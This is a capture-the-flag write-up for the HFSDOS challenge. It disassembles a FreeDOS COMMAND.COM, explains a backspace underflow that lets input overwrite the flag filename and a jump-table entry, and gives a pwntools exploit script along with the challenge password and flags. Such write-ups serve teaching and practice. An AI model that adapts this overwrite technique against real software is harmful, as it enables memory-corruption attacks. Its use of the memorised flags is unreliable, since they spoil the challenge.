---
tags: ["pwn", "dos", "re"]
author: "bennofs"
---
# Challenge
> You don't need a modern 'secure' language when you write bug-free code :) The flag is in FLAG2 

This was the second part of the HFSMBR/HFSDOS challenge. After entering the correct password for HFSMBR, we are greeted with:

```
[HFS SECURE SHELL] Here is your flag for HFS-MBR: midnight{w0ah_Sh!t_jU5t_g0t_RE
ALmode} 
[HFS SECURE SHELL] loaded at 100f:0100 (0x101f0) and ready for some binary carna
ge!

[HFS-DOS]> 
```

# Solution
Looking at the strings of the image, the challenge appears to be based on FreeDOS. So let's mount the image to extract the files from the FS:

```
$ sudo losetup -P -f dos.img
$ sudo mount /dev/loop0p1 /mnt
$ ls /mnt
AUTOEXEC.BAT*  COMMAND.COM*  FLAG1*  FLAG2*  KERNEL.SYS*
```

The file we are looking for is COMMAND.COM. This file implements the the command interpreter we saw when we started the challenge. Here's the disassembly of the command-reading loop:

```
seg000:019D read_command:                           ; CODE XREF: commandLoop↑j
seg000:019D                 mov     bx, offset input_buf
seg000:01A0                 mov     input_ptr, bx
seg000:01A4                 mov     input_len, 0
seg000:01AA                 xor     bx, bx
seg000:01AC
seg000:01AC input_loop:                             ; CODE XREF: commandLoop+2D↓j
seg000:01AC                                         ; commandLoop+37↓j ...
seg000:01AC                 mov     bh, 1
seg000:01AE                 mov     ah, 0
seg000:01B0                 int     16h             ; KEYBOARD - READ CHAR FROM BUFFER, WAIT IF EMPTY
seg000:01B0                                         ; Return: AH = scan code, AL = character
seg000:01B2                 cmp     al, 0Dh
seg000:01B4                 jz      short process_command
seg000:01B6                 cmp     al, 7Fh
seg000:01B8                 jnz     short store_char
seg000:01BA                 sub     input_ptr, 1
seg000:01BF                 mov     ah, 3
seg000:01C1                 mov     bh, 0
seg000:01C3                 int     10h             ; - VIDEO - READ CURSOR POSITION
seg000:01C3                                         ; BH = page number
seg000:01C3                                         ; Return: DH,DL = row,column, CH = cursor start line, CL = cursor end line
seg000:01C5                 cmp     dl, 0
seg000:01C8                 jz      short input_loop
seg000:01CA                 dec     dl
seg000:01CC                 mov     ah, 2
seg000:01CE                 mov     bh, 0
seg000:01D0                 int     10h             ; - VIDEO - SET CURSOR POSITION
seg000:01D0                                         ; DH,DL = row, column (0,0 = upper left)
seg000:01D0                                         ; BH = page number
seg000:01D2                 jmp     short input_loop
seg000:01D4 ; --------------------------------------------
```

Note that if `al` (character) is `0x7F` (backspace), we decrement the pointer to the current position in our buffer if the current cursor position is greater than 0.
But because of the prompt, even at the start of the buffer the cursor column is greater than zero. This allows us to overwrite data before the start of the buffer. 
Let's check what's located before the input buffer:

```
seg000:0389                 dw offset jmp_halt
seg000:0395 aFlag1          db 'FLAG1',0            ; DATA XREF: openFlag1+A↑o
seg000:039B                 db  24h ; $
seg000:039C input_buf       db    0                 ; DATA XREF: commandLoop:read_command↑o
```

So there is the name of FLAG1 file and the end of the jump table for the command dispatch. This is quite nice, because it makes the exploit easy:

- overwrite FLAG1 with FLAG2 by changing 1 -> 2
- change `offset jmp_halt` (0x171) to `offset printFlagStage1` (0x14F)

Here's a script that does just that:

```python
#!/usr/bin/env python3
from pwn import *

r = remote(b"hfs-os-01.play.midnightsunctf.se", 31337)
r.sendafter(b"]> ", b"sojupwner")
r.recvline_contains(b"Correct password!")
r.send(b"adssad\r")
r.sendafter(b"]>", b"\x7f"*3 + b"2\r")
r.sendafter(b"]>", b"\x7f"*9 + b"O\r")
r.sendafter(b"]>", b"exit\r")
r.recvuntil(b"Here is your flag")
print(r.recvuntil(b"}").replace(b"\r\n", b""))
r.stream()
```

which gets the flag: 

```
$ ./script.py
[+] Opening connection to b'hfs-os-01.play.midnightsunctf.se' on port 31337: Done
b' for HFS-MBR: midnight{th4t_was_n0t_4_buG_1t_is_a_fEatuR3}'
```
